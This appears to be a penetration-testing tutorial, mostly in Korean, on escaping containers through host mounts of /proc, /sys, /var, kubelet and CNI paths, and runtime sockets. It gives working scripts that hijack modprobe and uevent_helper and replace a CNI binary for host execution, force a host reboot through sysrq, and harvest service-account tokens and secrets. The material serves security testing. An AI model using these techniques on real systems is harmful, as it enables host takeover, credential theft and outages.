# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 개요

Host mounts는 가장 중요한 실전 container-escape 표면 중 하나입니다. 잘 격리된 프로세스 뷰를 호스트 리소스에 대한 직접적인 가시성으로 무너뜨리는 경우가 많기 때문입니다. 위험한 경우는 `/`에만 한정되지 않습니다. `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, 또는 device 관련 경로의 bind mount는 kernel 제어, credentials, 인접한 container filesystem, runtime 관리 인터페이스를 노출할 수 있습니다.

이 페이지가 개별 protection 페이지와 별도로 존재하는 이유는 abuse model이 여러 영역에 걸쳐 있기 때문입니다. 쓰기 가능한 host mount가 위험한 이유는 mount namespaces 때문이기도 하고, user namespaces 때문이기도 하며, AppArmor 또는 SELinux coverage 때문이기도 하고, 정확히 어떤 host path가 노출되었는지 때문이기도 합니다. 이를 별도의 주제로 다루면 attack surface를 훨씬 더 쉽게 추론할 수 있습니다.

## `/proc` Exposure

procfs에는 일반적인 process 정보와 영향이 큰 kernel control interfaces가 모두 들어 있습니다. 따라서 `-v /proc:/host/proc` 같은 bind mount나 예상치 못한 writable proc entries를 노출하는 container view는 information disclosure, denial of service, 또는 직접적인 host code execution으로 이어질 수 있습니다.

고가치 procfs 경로는 다음과 같습니다:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

먼저 어떤 고가치 procfs 항목이 보이거나 writable한지 확인합니다:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
이 경로들은 서로 다른 이유로 흥미롭습니다. `core_pattern`, `modprobe`, `binfmt_misc`는 writable일 때 host code-execution 경로가 될 수 있습니다. `kallsyms`, `kmsg`, `kcore`, `config.gz`는 kernel exploitation을 위한 강력한 reconnaissance 소스입니다. `sched_debug`와 `mountinfo`는 process, cgroup, filesystem context를 드러내며, container 내부에서 host 레이아웃을 재구성하는 데 도움이 됩니다.

각 경로의 실질적 가치는 다르며, 이들을 모두 같은 영향도로 취급하면 triage가 더 어려워집니다:

- `/proc/sys/kernel/core_pattern`
If writable, 이것은 가장 영향이 큰 procfs 경로 중 하나입니다. kernel이 crash 후 pipe handler를 실행하기 때문입니다. container가 `core_pattern`을 자신의 overlay 또는 mounted host path에 저장된 payload로 지정할 수 있다면, 종종 host code execution을 얻을 수 있습니다. 전용 예시는 [read-only-paths.md](protections/read-only-paths.md)도 보세요.
- `/proc/sys/kernel/modprobe`
이 경로는 module-loading logic을 호출해야 할 때 kernel이 사용하는 userspace helper를 제어합니다. container에서 writable이고 host context에서 해석된다면, 또 다른 host code execution primitive가 될 수 있습니다. 특히 helper 경로를 trigger하는 방법과 결합될 때 매우 흥미롭습니다.
- `/proc/sys/vm/panic_on_oom`
이것은 보통 깔끔한 escape primitive는 아니지만, OOM 조건을 kernel panic 동작으로 바꿔 메모리 압박을 host-wide denial of service로 전환할 수 있습니다.
- `/proc/sys/fs/binfmt_misc`
registration interface가 writable하면, 공격자는 선택한 magic value에 대한 handler를 등록하고 일치하는 파일이 실행될 때 host-context execution을 얻을 수 있습니다.
- `/proc/config.gz`
kernel exploit triage에 유용합니다. host package metadata 없이도 어떤 subsystem, mitigation, optional kernel feature가 활성화되어 있는지 파악하는 데 도움이 됩니다.
- `/proc/sysrq-trigger`
주로 denial-of-service 경로이지만, 매우 심각한 경로입니다. host를 즉시 reboot, panic, 또는 다른 방식으로 방해할 수 있습니다.
- `/proc/kmsg`
kernel ring buffer 메시지를 보여줍니다. host fingerprinting, crash analysis, 그리고 일부 환경에서는 kernel exploitation에 도움이 되는 정보 leak에 유용합니다.
- `/proc/kallsyms`
읽을 수 있다면 매우 가치가 있습니다. exported kernel symbol 정보를 노출하며, kernel exploit development 중 address randomization 가정을 무너뜨리는 데 도움이 될 수 있습니다.
- `/proc/[pid]/mem`
직접적인 process-memory interface입니다. 대상 process가 필요한 ptrace-style 조건으로 접근 가능하다면, 다른 process의 memory를 읽거나 수정할 수 있습니다. 실제 영향은 credentials, `hidepid`, Yama, ptrace 제한에 크게 좌우되므로, 강력하지만 조건적인 경로입니다.
- `/proc/kcore`
시스템 memory의 core-image-style view를 노출합니다. 파일이 매우 크고 사용하기 까다롭지만, 의미 있게 읽을 수 있다면 host memory surface가 심하게 노출되어 있음을 의미합니다.
- `/proc/kmem` and `/proc/mem`
역사적으로 영향이 큰 raw memory interface입니다. 많은 modern system에서는 비활성화되었거나 강하게 제한되지만, 존재하고 사용 가능하다면 critical finding으로 취급해야 합니다.
- `/proc/sched_debug`
scheduling과 task 정보를 leak하여, 다른 process view가 예상보다 더 깔끔해 보일 때도 host process identity를 드러낼 수 있습니다.
- `/proc/[pid]/mountinfo`
container가 host에서 실제로 어디에 있는지, 어떤 path가 overlay-backed인지, 그리고 writable mount가 host content에 해당하는지 아니면 container layer에만 해당하는지 재구성하는 데 매우 유용합니다.

`/proc/[pid]/mountinfo` 또는 overlay 세부 정보가 읽을 수 있다면, 이를 사용해 container filesystem의 host path를 복구하세요:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
이러한 명령은 유용하다. 여러 host-execution 기법은 container 내부의 path를 host 관점에서의 대응 path로 바꿔야 하기 때문이다.

### Full Example: `modprobe` Helper Path Abuse

만약 `/proc/sys/kernel/modprobe`가 container에서 writable하고, helper path가 host context에서 해석된다면, 이를 attacker-controlled payload로 redirect할 수 있다:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
정확한 트리거는 대상과 kernel 동작에 따라 다르지만, 중요한 점은 writable helper path가 이후의 kernel helper 호출을 attacker-controlled host-path content로 redirect할 수 있다는 것이다.

### Full Example: `kallsyms`, `kmsg`, And `config.gz`를 사용한 Kernel Recon

목표가 즉각적인 escape가 아니라 exploitability assessment라면:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
이 명령들은 유용한 symbol information이 보이는지, 최근 kernel messages가 흥미로운 상태를 드러내는지, 그리고 어떤 kernel features나 mitigations가 컴파일되어 있는지 확인하는 데 도움이 됩니다. 영향은 보통 직접적인 escape는 아니지만, kernel-vulnerability triage를 크게 단축할 수 있습니다.

### Full Example: SysRq Host Reboot

If `/proc/sysrq-trigger` is writable and reaches the host view:
```bash
echo b > /proc/sysrq-trigger
```
효과는 즉각적인 host reboot입니다. 이것은 미묘한 예시는 아니지만, procfs 노출이 단순한 정보 유출보다 훨씬 더 심각할 수 있음을 분명히 보여줍니다.

## `/sys` Exposure

sysfs는 대량의 kernel 및 device state를 노출합니다. 일부 sysfs path는 주로 fingerprinting에 유용하지만, 다른 것들은 helper execution, device behavior, security-module configuration, 또는 firmware state에 영향을 줄 수 있습니다.

고가치 sysfs path에는 다음이 포함됩니다:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

이러한 path는 서로 다른 이유로 중요합니다. `/sys/class/thermal`은 thermal-management behavior에 영향을 주어, 노출이 심한 환경에서는 host stability에 영향을 줄 수 있습니다. `/sys/kernel/vmcoreinfo`는 crash-dump 및 kernel-layout 정보를 leak할 수 있으며, 이는 low-level host fingerprinting에 도움이 됩니다. `/sys/kernel/security`는 Linux Security Modules가 사용하는 `securityfs` interface이므로, 여기서 예상치 못한 접근은 MAC 관련 state를 노출하거나 변경할 수 있습니다. EFI variable path는 firmware-backed boot settings에 영향을 줄 수 있어, 일반적인 configuration file보다 훨씬 더 심각합니다. `/sys/kernel/debug` 아래의 `debugfs`는 특히 위험한데, 이는 원래 developer-oriented interface이며 hardened production-facing kernel API보다 안전성 기대치가 훨씬 낮기 때문입니다.

이러한 path를 확인할 때 유용한 review command는 다음과 같습니다:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
그 명령들이 흥미로운 이유는 다음과 같습니다:

- `/sys/kernel/security`는 AppArmor, SELinux, 또는 다른 LSM surface가 원래는 host-only로 남아 있어야 할 방식으로 노출되어 있는지 보여줄 수 있습니다.
- `/sys/kernel/debug`는 이 그룹에서 가장 심각한 발견인 경우가 많습니다. `debugfs`가 mount되어 있고 읽기 또는 쓰기가 가능하다면, 활성화된 debug nodes에 따라 정확한 위험이 달라지는 넓은 kernel-facing surface를 예상해야 합니다.
- EFI variable exposure는 덜 흔하지만, 존재한다면 일반적인 runtime files가 아니라 firmware-backed settings에 영향을 주기 때문에 영향이 큽니다.
- `/sys/class/thermal`은 주로 host 안정성과 hardware 상호작용과 관련이 있으며, 깔끔한 shell-style escape와는 주로 관련이 없습니다.
- `/sys/kernel/vmcoreinfo`는 주로 host fingerprinting과 crash-analysis 소스이며, 저수준 kernel state를 이해하는 데 유용합니다.

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper`가 writable하면, `uevent`가 트리거될 때 kernel이 attacker-controlled helper를 실행할 수 있습니다:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
그 이유는 helper 경로가 host의 관점에서 해석되기 때문이다. 일단 트리거되면, helper는 현재 container 내부가 아니라 host context에서 실행된다.

## `/var` Exposure

host의 `/var`를 container에 mount하는 것은 `/`를 mount하는 것만큼 극적이지 않아 보여서 종종 과소평가된다. 실제로는 runtime socket, container snapshot 디렉터리, kubelet이 관리하는 pod volume, projected service-account token, 그리고 인접한 application filesystem에 접근하기에 충분할 수 있다. 현대 node에서는 `/var`가 실제로 가장 운영상 흥미로운 container state가 있는 곳인 경우가 많다.

### Kubernetes Example

`hostPath: /var`가 있는 pod는 종종 다른 pod의 projected token과 overlay snapshot content를 읽을 수 있다:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
이 명령들은 mount가 단순한 애플리케이션 데이터만 노출하는지, 아니면 고영향 cluster credentials를 노출하는지 알려주기 때문에 유용하다. 읽을 수 있는 service-account token은 즉시 로컬 code execution을 Kubernetes API access로 바꿀 수 있다.

token이 존재한다면, token discovery에서 멈추지 말고 무엇에 접근할 수 있는지 확인하라:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
여기서의 영향은 로컬 node access보다 훨씬 클 수 있습니다. 광범위한 RBAC를 가진 token은 mounted `/var`를 cluster-wide compromise로 이어질 수 있습니다.

### Docker And containerd Example

Docker hosts에서는 관련 데이터가 종종 `/var/lib/docker` 아래에 있고, containerd-backed Kubernetes nodes에서는 `/var/lib/containerd` 또는 snapshotter-specific paths 아래에 있을 수 있습니다:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
마운트된 `/var`가 다른 워크로드의 쓰기 가능한 snapshot contents를 노출한다면, 공격자는 현재 container configuration을 건드리지 않고도 application files를 수정하거나, web content를 심거나, startup scripts를 변경할 수 있습니다.

쓰기 가능한 snapshot content가 발견된 뒤의 구체적인 악용 아이디어:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
이 명령들은 mounted `/var`의 세 가지 주요 impact family인 application tampering, secret recovery, 그리고 인접 workload로의 lateral movement를 보여주기 때문에 유용하다.

## Kubelet State, Plugins, And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin`, 또는 `/etc/cni/net.d`의 mount는 종종 privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, 그리고 storage helpers를 통해 노출된다. 이런 mounts는 "node plumbing"처럼 쉽게 무시되지만, 새 pods의 execution path에 직접 들어가 있으며 kubelet credentials, projected secrets, registration sockets, 그리고 실행 가능한 host-side plugin binaries를 포함하는 경우가 많다.

고가치 대상은 다음과 같다:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

유용한 review commands는 다음과 같다:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
왜 이 경로들이 중요한가:

- `/var/lib/kubelet/pki`는 kubelet client certificates와 다른 node-local credentials를 노출할 수 있으며, cluster design에 따라 이 credential들은 때때로 API server나 kubelet-facing TLS endpoints에 재사용될 수 있다.
- `/var/lib/kubelet/pods`에는 종종 같은 node의 인접 pod들을 위한 projected service-account tokens과 mounted Secrets가 들어 있다.
- `/var/lib/kubelet/pod-resources/kubelet.sock`는 주로 reconnaissance surface이지만, 매우 유용하다. 현재 어떤 pods와 containers가 GPUs, hugepages, SR-IOV devices, 그리고 기타 희귀한 node-local resources를 소유하고 있는지 보여준다.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, 그리고 `/var/lib/kubelet/plugins_registry`는 어떤 CSI, DRA, device plugins가 설치되어 있는지와 kubelet이 어떤 sockets와 통신할 것으로 예상하는지를 보여준다. 만약 그 디렉터리들이 단순히 readable가 아니라 writable하다면, 이 finding은 훨씬 더 심각해진다.
- `/opt/cni/bin`과 `/etc/cni/net.d`는 pod-network setup path에 직접 위치한다. 여기서 writable access는 종종 단순한 configuration exposure가 아니라, 지연된 host-execution primitive가 된다.

### Full Example: Writable `/opt/cni/bin`

host CNI binary directory가 read-write로 mounted되어 있다면, plugin을 교체하는 것만으로도 해당 node에서 kubelet이 다음에 pod sandbox를 생성할 때 host execution을 얻기에 충분할 수 있다:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
이것은 mounted `docker.sock`만큼 즉각적이지는 않지만, 손상된 Kubernetes 인프라스트럭처 pods에서는 종종 더 현실적입니다. 중요한 점은 수정된 binary가 현재 container가 아니라 나중에 host network setup flow에 의해 실행된다는 것입니다.


## Runtime Sockets

민감한 host mounts는 전체 directories보다 runtime sockets를 포함하는 경우가 많습니다. 이것들은 매우 중요해서 여기서 명시적으로 다시 언급할 가치가 있습니다:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
See [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) for full exploitation flows once one of these sockets is mounted.

빠른 첫 상호작용 패턴으로는:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
이들 중 하나가 성공하면, "mounted socket"에서 "더 높은 권한의 sibling container를 시작"하는 경로는 보통 어떤 kernel breakout 경로보다 훨씬 짧습니다.

## Mount-Related CVEs

Host mounts는 runtime 취약점과도 맞닿아 있습니다. 중요한 최근 사례는 다음과 같습니다:

- `CVE-2024-21626` in `runc`에서, 누출된 directory file descriptor가 working directory를 host filesystem 위에 놓이게 할 수 있었습니다.
- `CVE-2024-23651`, `CVE-2024-23652`, `CVE-2024-23653` in BuildKit에서, 악의적인 Dockerfiles, frontends, 그리고 `RUN --mount` 흐름이 build 중에 host file access, deletion, 또는 elevated privileges를 다시 가능하게 할 수 있었습니다.
- `CVE-2024-1753` in Buildah and Podman build flows에서, build 중에 조작된 bind mounts가 `/`를 read-write로 노출할 수 있었습니다.
- `CVE-2025-47290` in `containerd` 2.1.0에서, image unpack 중 TOCTOU가 특별히 조작된 image로 하여금 pull 중 host filesystem을 수정하게 할 수 있었습니다.

이러한 CVE들이 여기서 중요한 이유는 mount handling이 operator configuration만의 문제가 아니기 때문입니다. runtime 자체도 mount-driven escape 조건을 도입할 수 있습니다.

## Checks

다음 명령으로 가장 가치 있는 mount 노출을 빠르게 찾으세요:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
여기서 흥미로운 점은 다음과 같습니다:

- Host root, `/proc`, `/sys`, `/var`, 그리고 runtime sockets는 모두 우선순위가 높은 발견 사항입니다.
- Writable proc/sys 항목은 종종 mount가 안전한 container view가 아니라 host-global kernel controls를 노출하고 있음을 의미합니다.
- Mounted `/var` paths는 filesystem review뿐 아니라 credential 및 neighboring-workload review도 필요합니다.
- Kubelet state directories와 CNI/plugin paths는 종종 node의 pod-creation 및 credential-distribution 경로에 직접 위치하므로 runtime sockets와 같은 우선순위를 가져야 합니다.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
